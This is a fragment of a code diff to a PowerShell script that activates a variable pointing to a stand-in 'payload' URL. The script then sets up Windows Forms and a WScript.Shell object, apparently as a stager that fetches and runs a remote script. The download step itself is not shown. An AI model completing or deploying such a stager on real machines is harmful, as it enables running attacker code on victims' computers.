@@ -3,7 +3,7 @@
 
 # Enter your link to the script ↓
 
-# $link = "https://link.payload.example"
+$link = "https://link.payload.example"
 
 Add-Type -AssemblyName System.Windows.Forms
 $o=New-Object -ComObject WScript.Shell
